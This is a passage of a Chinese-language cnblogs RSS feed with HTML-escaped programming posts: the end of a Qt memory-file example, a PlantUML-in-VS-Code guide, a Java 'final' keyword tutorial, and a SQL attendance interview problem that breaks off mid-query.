&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     ui-&amp;gt;setupUi(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建内存文件&lt;/span&gt;
&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;    QByteArray array;
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;     QBuffer memfile(&amp;amp;&lt;span&gt;array);
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;    memfile.open(QIODevice::WriteOnly);
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     memfile.write(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111111111111&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     memfile.write(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;222222222222&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; &lt;span&gt;    memfile.close();
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;     qDebug() &amp;lt;&amp;lt;&lt;span&gt; memfile.buffer();
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;     qDebug() &amp;lt;&amp;lt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;array&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span&gt; array;
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; 
&lt;span&gt;17&lt;/span&gt; &lt;span&gt;    QBuffer memfile1;
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;     QDataStream stream(&amp;amp;&lt;span&gt;memfile1);
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; &lt;span&gt;    memfile1.open(QIODevice::WriteOnly);
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;     stream &amp;lt;&amp;lt; QString(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;测试&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;) &amp;lt;&amp;lt; &lt;span&gt;250&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt; &lt;span&gt;    memfile1.close();
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt; 
&lt;span&gt;23&lt;/span&gt; &lt;span&gt;    memfile1.open(QIODevice::ReadOnly);
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;     QDataStream &lt;span&gt;in&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt;     &lt;span&gt;in&lt;/span&gt;.setDevice(&amp;amp;&lt;span&gt;memfile1);
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; &lt;span&gt;    QString str;
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt;     &lt;span&gt;int&lt;/span&gt;&lt;span&gt; a;
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt;     &lt;span&gt;in&lt;/span&gt; &amp;gt;&amp;gt; str &amp;gt;&amp;gt;&lt;span&gt; a;
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt; &lt;span&gt;    memfile1.close();
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt;     qDebug() &amp;lt;&amp;lt; str.toUtf8().data() &amp;lt;&amp;lt;&lt;span&gt; a;
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
</description>
<pubDate>Wed, 08 Jul 2020 16:06:00 +0000</pubDate>
<dc:creator>zhengcixi</dc:creator>
<og:description>1 简介 参考视频：https://www.bilibili.com/video/BV1XW411x7NU?p=45 参考文档：《Qt教程.docx》 说明：本文主要介绍Qt的文件系统。 2 知识点</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/mrlayfolk/p/13270116.html</dc:identifier>
</item>
<item>
<title>还能这么玩？用VsCode画类图、流程图、时序图、状态图...不要太爽！ - 柠檬橙1024</title>
<link>http://www.cnblogs.com/NanoDragon/p/12642990.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/NanoDragon/p/12642990.html</guid>
<description>&lt;p&gt;软件设计中，有好几种图需要画，比如流程图、类图、组件图等，我知道大部分人画流程图一般都会用微软的viso绘制，我之前也是这个习惯。 viso画图有个不好的地方是需要时刻去调整线条和边框已达到简洁美观，今天我给大家介绍一款程序员画图神器PlantUML，一款你用了就爱上的画图软件！&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;89.803080308031&quot;&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;文章每周持续更新，各位的「三连」是对我最大的肯定。可以微信搜索公众号「 后端技术学堂 」第一时间阅读（一般比博客早更新一到两篇）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;软件设计中，有好几种图需要画，比如流程图、类图、组件图等，我知道大部分人画流程图一般都会用微软的viso绘制，我之前也是这个习惯。&lt;br/&gt;viso画图有个不好的地方是需要时刻去调整线条和边框已达到简洁美观，今天我给大家介绍一款程序员画图神器PlantUML，一款你用了就爱上的画图软件！&lt;/p&gt;
&lt;p&gt;VsCode以插件的形式支持了这款画图神器，还不知道VsCode？&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;VsCode 强大地自定义功能，已经成为程序员最爱编辑器。&lt;br/&gt;Microsoft在2015年4月30日Build 开发者大会上正式宣布了 Visual Studio Code 项目:一个运行于 Mac OS X、Windows和Linux之上的，针对于编写现代 Web 和云应用的跨平台源代码编辑器。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7.7919075144509&quot;&gt;
&lt;p&gt;该编辑器也集成了所有一款现代编辑器所应该具备的特性，包括语法高亮(syntax high lighting)，可定制的热键绑定(customizable keyboard bindings)，括号匹配(bracket matching)以及代码片段收集(snippets)。Somasegar 也告诉笔者这款编辑器也拥有对 Git 的开箱即用的支持。引用&lt;a href=&quot;https://baike.so.com/doc/24428308-25261478.html&quot;&gt;360百科&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;主角出场&quot;&gt;主角出场&lt;/h2&gt;
&lt;h3 id=&quot;plantuml&quot;&gt;PlantUML&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;PlantUML是一个开源项目，支持快速绘制：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;时序图&lt;br/&gt;用例图&lt;br/&gt;类图&lt;br/&gt;活动图 (旧版语法在此处)&lt;br/&gt;组件图&lt;br/&gt;状态图&lt;br/&gt;对象图&lt;br/&gt;部署图&lt;br/&gt;定时图&lt;br/&gt;...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;同时还支持以下非UML图:&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;线框图形界面&lt;br/&gt;架构图&lt;br/&gt;规范和描述语言 (SDL)&lt;br/&gt;Ditaa diagram&lt;br/&gt;甘特图&lt;br/&gt;MindMap diagram&lt;br/&gt;以 AsciiMath 或 JLaTeXMath 符号的数学公式&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;通过简单直观的语言来定义这些示意图,与MarkDown有相似的作用，这两种语言一个主要面向文本渲染一个主要用于图形绘制。&lt;/p&gt;
&lt;h4 id=&quot;语法&quot;&gt;语法&lt;/h4&gt;
&lt;p&gt;语法简单明了，查看以下&lt;a href=&quot;http://plantuml.com/zh/sequence-diagram&quot;&gt;官方教程&lt;/a&gt;&lt;br/&gt;&lt;strong&gt;我截取几个官网的事例图片在这里：&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&quot;图中的图片都是用源代码-写-出来的哦！是不是很cool&quot;&gt;图中的图片都是用源代码' '写'' 出来的哦！是不是很cool&lt;/h4&gt;
&lt;h3 id=&quot;plantuml遇上vscode&quot;&gt;PlantUML遇上VsCode&lt;/h3&gt;
&lt;h4 id=&quot;安装&quot;&gt;安装&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;安装graphviz-2.38.msi&lt;/li&gt;
&lt;li&gt;安装2个vscode插件:&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;PlantUML、Graphviz Preview&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;例子&quot;&gt;例子&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-plantUML&quot;&gt;@startuml
Alice -&amp;gt; Bob: Authentication Request
Bob --&amp;gt; Alice: Authentication Response

Alice -&amp;gt; Bob: Another authentication Request
Alice &amp;lt;-- Bob: another authentication Response
@enduml
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;预览&quot;&gt;预览&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Alt+D&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;文件格式&quot;&gt;文件格式&lt;/h4&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;.wsd, .pu, .puml, .plantuml, .iuml&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;如何导出&quot;&gt;如何导出&lt;/h4&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;F1/ctrl+shift+p; PlantUML:导出当前图表；选择导出格式png；导出即可。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;好了，这么好用工具赶紧用起来吧！&quot;&gt;好了，这么好用工具赶紧用起来吧！&lt;/h4&gt;
&lt;h2 id=&quot;更多&quot;&gt;更多&lt;/h2&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;可以微信搜索公众号「 后端技术学堂 」回复「资料」有我给你准备的各种编程学习资料。文章每周持续更新，我们下期见！&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/753603/202007/753603-20200706002147900-449638918.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;</description>
<pubDate>Wed, 08 Jul 2020 15:41:00 +0000</pubDate>
<dc:creator>柠檬橙1024</dc:creator>
<og:description>软件设计中，有好几种图需要画，比如流程图、类图、组件图等，我知道大部分人画流程图一般都会用微软的viso绘制，我之前也是这个习惯。 viso画图有个不好的地方是需要时刻去调整线条和边框已达到简洁美观，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/NanoDragon/p/12642990.html</dc:identifier>
</item>
<item>
<title>Java入门系列之final - Jeffcky</title>
<link>http://www.cnblogs.com/CreateMyself/p/13269362.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/CreateMyself/p/13269362.html</guid>
<description>&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;在C#经典面试中掺杂过Java的final关键字，主要用于类不能被继承，在C#则是利用关键字seal修饰类为密封类，而在Java中的final关键字的具体用法包含C#中const、readonly、seal三者使用之和，本节我们来聊聊Java的关键字final。&lt;/p&gt;
&lt;h2&gt;关键字final&lt;/h2&gt;
&lt;p&gt;通过final关键字修饰意为无法改变，在Java早期版本通过final可以改善性能或者提高效率，但现如今版本final已经无所谓性能，我们只关注于在设计时应用final的具体场景，&lt;span&gt;final关键字包含两层含义：其一，编译时常量不变，其二，运行时初始化值而后不被改变。&lt;/span&gt;这两者其实就是C#中的const和readonly关键字的使用。 final主要用于三种情况，修饰数据、方法、类，但本质上都是表示不可变，至于“不可变”的含义就看对应哪种场景。当然加上static修饰符只是表明在内存中只保存一份数据，这里我们就不做过多探讨。&lt;/p&gt;
&lt;h3&gt;数据&lt;/h3&gt;
&lt;p&gt;编译时常量和C#中概念一致，只不过C#用const修饰，同时对于变量的命名都是采用大写方式，单词与单词之间用下划线隔开，比如如下编译时常量&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; VALUE_ONE = 1;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上述已经说过，final不仅仅只是对于编译时必须为常量，还可以用于运行时初始化时的值，比如通过随机函数生成值&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt;  &lt;span&gt;static&lt;/span&gt; Random random = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Random();

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; VALUE_ONE = random.nextInt(20);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这种运行时初始化值方式就是C#中的readonly，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; Random random = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Random();

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; VALUE_ONE = random.Next(&lt;span&gt;20&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;对于C#中的readonly初始值，我们知道除了在定义时赋值，也可以在构造函数中初始化值，若是再加上static，很显然必须在静态构造函数中初始化&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Program
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; VALUE_ONE;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Program()
    {
        VALUE_ONE &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;final关键字同样也能达到上述使用readonly的效果，只不过在Java中称其为“空白final”，所谓空白final是指被声明为final但未给定初始值，但是无论何种情况，编译器必须确保在使用数据之前必须进行初始化&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Main {

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; VALUE_ONE;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Main() {
        VALUE_ONE &lt;/span&gt;= 1&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;参数&lt;/h3&gt;
&lt;p&gt;无论是作为方法参数还是作为初始化变量的修饰，我们可以更改该参数里面的值，但是无法更改参数引用所指向的对象。如下示例为修饰初始化类变量，作为方法参数同理，这里不再阐述。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Value {
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; i;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Value(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; i) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.i =&lt;span&gt; i;
    }
}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; FinalDemo {
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Value value = &lt;span&gt;new&lt;/span&gt; Value(1&lt;span&gt;);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Main {

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {

        FinalDemo finalDemo &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; FinalDemo();

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;可以更改final参数里的值&lt;/span&gt;
        finalDemo.value.i = 2&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;不能更改参数所指向的对象（编译报错）&lt;/span&gt;
        finalDemo.value = &lt;span&gt;new&lt;/span&gt; Value(2&lt;span&gt;);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;方法&lt;/h3&gt;
&lt;p&gt;final修饰方法是将方法进行锁定，以防止任何继承类修改它本身的含义，此意为用以标记该方法不能被覆盖（对于对象范围内）或隐藏，这为后续开发人员创建其方法所在类的子类无法覆盖其行为提供有力的保证。比如如下计数器则是一个很好的例子&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Counter {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; counter = 0&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; count() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; ++&lt;span&gt;counter;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; reset() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (counter = 0&lt;span&gt;);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;但是我们去掉上述count方法的修饰符，进行如下操作，很显然将破坏原始方法的行为，打印出结果为2&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
Counter c = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Counter() {
            &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; count() {
                &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;.count();
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;super&lt;/span&gt;&lt;span&gt;.count();
            }
        };
System.out.println(c.count());&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;类&lt;/h3&gt;
&lt;p&gt;若将整个类定义为final时，这说明此类将不会被继承和C#中seal修饰符如出一辙，或出于安全考虑，或出于设计已确定该类不会再做任何变动，不希望该类有子类&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Counter {
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;编译发生错误&lt;/span&gt;
&lt;span&gt;class&lt;/span&gt; SubCounter &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; Counter {
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;总结&lt;/h2&gt;
&lt;p&gt;本节我们详细讲解了final关键字，该关键字是C#中const、readonly、seal三者使用的组合，Java编程思想虽然将其划分为数据、方法、类，这里我认为划分为变量（包含数据和参数）、方法、类更合理。其实语法都大同小异，还是那句话，学习的本质在于归纳总结并举一反三从而内化。 &lt;/p&gt;
</description>
<pubDate>Wed, 08 Jul 2020 15:27:00 +0000</pubDate>
<dc:creator>Jeffcky</dc:creator>
<og:description>前言 在C#经典面试中掺杂过Java的final关键字，主要用于类不能被继承，在C#则是利用关键字seal修饰类为密封类，而在Java中的final关键字的具体用法包含C#中const、readonl</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/CreateMyself/p/13269362.html</dc:identifier>
</item>
<item>
<title>师兄大厂面试遇到这条 SQL 数据分析题，差点含泪而归！ - 云祁</title>
<link>http://www.cnblogs.com/beiisbei/p/13269964.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/beiisbei/p/13269964.html</guid>
<description>&lt;p&gt;师兄在面试时遇到了这条SQL题，回来我帮他参谋了下，觉得非常有意思，让我们一起来看看这道差点吊打师兄的笔试题吧！&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;194.5&quot;&gt;
&lt;blockquote readability=&quot;14&quot;&gt;
&lt;p&gt;&lt;strong&gt;写在前面&lt;/strong&gt;：我是「云祁」，一枚热爱技术、会写诗的大数据开发猿。昵称来源于王安石诗中一句 &lt;code&gt;[ 云之祁祁，或雨于渊 ]&lt;/code&gt; ，甚是喜欢。&lt;/p&gt;&lt;p&gt;写博客一方面是对自己学习的一点点总结及记录，另一方面则是希望能够帮助更多对大数据感兴趣的朋友。如果你也对 &lt;code&gt;数据中台、数据建模、数据分析以及Flink/Spark/Hadoop/数仓开发&lt;/code&gt; 感兴趣，可以关注我的动态 ，让我们一起挖掘大数据的价值~&lt;/p&gt;&lt;p&gt;&lt;code&gt;每天都要进步一点点，生命不是要超越别人，而是要超越自己！ (ง •_•)ง&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;一、背景&quot;&gt;一、背景&lt;/h2&gt;
&lt;p&gt;师兄在面试时遇到了这条SQL题，回来我帮他参谋了下，觉得非常有意思，让我们一起来看看这道差点吊打师兄的笔试题吧！🤒&lt;/p&gt;
&lt;p&gt;对方给了两张表（分别是：派工记录表和打卡记录表），以及一张需求表（需要我们写查询语句得出），内容如下：&lt;/p&gt;
&lt;h2 id=&quot;二、派工记录表&quot;&gt;二、派工记录表&lt;/h2&gt;
&lt;p&gt;1、表示某人从某日开始到某日结束，按要求工作，派工期间每日打卡时间必须在“要求到岗时间”前（含要求时间，精确到分钟），否则迟到。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;例如：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;要求7：00，则6:59或者7:00:59 都不算迟到；7:01则视为迟到1分钟&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2、&lt;strong&gt;行1中“派工结束日期”为null&lt;/strong&gt;，表示此人的工作结束时间尚未确定，还在搬砖中；&lt;br/&gt;行2中派工结束日期为2020-02-15，表示派工于02-15日结束。&lt;/p&gt;
&lt;p&gt;3、假设员工名字不重复，每人只有一条派工信息&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;建表语句如下：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot;&gt;create table work_plan
(
worker_name varchar(10),     --人员
start_date date,             --派工起始日
end_date date,               --派工截止日
sign_time varchar(10)        --派工期间的需要打卡时间
)

insert into work_plan values
('张三','2020-01-01',null,'06:30'),
('李四','2020-02-01','2020-02-15','07:00'),
('王五','2019-12-29','2020-03-30','06:00'),
('赵六','2019-12-29','2020-03-30','06:00')
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200318165018141.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;三、打卡记录表&quot;&gt;三、打卡记录表&lt;/h2&gt;
&lt;p&gt;在员工每次按指纹考勤时&lt;br/&gt;都会生成一条记录&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;建表语句如下：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot;&gt;create table sign_log
(
worker_name varchar(10),
sign_time datetime
)

insert into sign_log values  
('张三','2020-02-16 04:01'),
('张三','2020-02-16 05:02'),
('张三','2020-02-16 06:03'),
('王五','2020-02-16 07:03'),
('王五','2020-02-16 08:03'),
('王五','2020-02-16 09:03')
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200318171708189.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;四、需求&quot;&gt;四、需求&lt;/h2&gt;
&lt;p&gt;写一个查询语句，输入参数：日期（date），输出表格如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200318172810203.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;strong&gt;注：&lt;br/&gt;1、2020-02-16李四派工期已结束，不在派工期间不需要计算考勤，故不用显示&lt;br/&gt;2、赵六在当日没有打卡，按照迟到算，迟到时间1440分钟&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;五、思路&quot;&gt;五、思路&lt;/h2&gt;
&lt;p&gt;我们要最终得到迟到时间，需要用表二中最早的打卡时间减去表一中要求的截至打卡时间，但很明显两个表日期的数据格式不一致，对表一的时间数据 sing_time 我们需要和年份进行拼接，然后再与表二的打卡时间进行比较，即可得出最终我们需要的迟到时间。😑&lt;/p&gt;
&lt;p&gt;但在实际写查询语句时，我发现那样会过于繁琐，变考虑将上述步骤通过 SQL 中自定义函数来实现。先来复习下MySQL中的自定义函数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;自定义函数实例：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;先来一个简单的，创建一个函数将&lt;code&gt;'2009-06-23 00:00:00'&lt;/code&gt;这样格式的datetime时间转化为&lt;code&gt;'2009年6月23日0时0分0秒'&lt;/code&gt;这样的格式：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot;&gt;DELIMITER $$
DROP FUNCTION IF EXISTS `sp_test`.`getdate`$$
CREATE FUNCTION `sp_test`.`getdate`(gdate datetime) RETURNS varchar(255)
BEGIN
DECLARE x VARCHAR(255) DEFAULT '';
SET x= date_format(gdate,'%Y年%m月%d日%h时%i分%s秒');
RETURN x;
END $$
DELIMITER ;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;解析：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第一句是定义一个结束标识符，因为MySQL默认是以分号作为SQL语句的结束符的，而函数体内部要用到分号，所以会跟默认的SQL结束符发生冲突，所以需要先定义一个其他的符号作为SQL的结束符；&lt;/p&gt;
&lt;p&gt;第二句是如果这个函数已经存在了，就删除掉，sp_test是数据库的名字，函数是跟数据库相关联的，getdate是函数的名字；&lt;/p&gt;
&lt;p&gt;第三句是创建一个函数，（）里是参数的名字和类型，RETURNS 定义这个函数返回值的类型；&lt;/p&gt;
&lt;p&gt;函数体必须放在BEGIN END之间；&lt;/p&gt;
&lt;p&gt;DECLARE 是定义函数体的变量，这里定义一个变量x,默认是空，然后SET给x变量赋值；&lt;/p&gt;
&lt;p&gt;RETURN 是返回值，这里把变量x返回，x的类型必须与第三句中定义的返回类型一致。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;调用：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot;&gt;SELECT getdate('2009-06-23 00：00：00');
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;返回 '2009年06月23日00时00分00秒'&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;六、最终答案&quot;&gt;六、最终答案&lt;/h2&gt;
&lt;p&gt;我们先来完成时间处理的自定义函数，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot;&gt;DELIMITER $$
DROP FUNCTION IF EXISTS func_date_sub $$
-- d1 6:00 d2 '2020-2-16 4:5:0'
CREATE FUNCTION func_date_sub(d1 VARCHAR(20),d2 DATETIME) RETURNS INT
BEGIN
  IF d2 IS NULL THEN
        RETURN -1440;
  ELSE
        RETURN CEIL((UNIX_TIMESTAMP(CONCAT('2020-2-16 ',d1))-UNIX_TIMESTAMP(d2))/60);
  END IF;
  END $$
DELIMITER ;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;SQL 查询语句如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot;&gt;select res.worker_name,res.attend,if(res.latetime&amp;lt;0,'是','否') as isLate,if(
res.latetime&amp;lt;0,abs(res.latetime),0) as latetime from
(select ck.worker_name,ck.attend,func_date_sub(ck.sign_time,ck.st) latetime
from (select e.worker_name,e.sign_time,'2020-02-16' as attend,k.st from 
(select * from work_plan 
where datediff(end_date,'2020-2-16')&amp;gt;0 
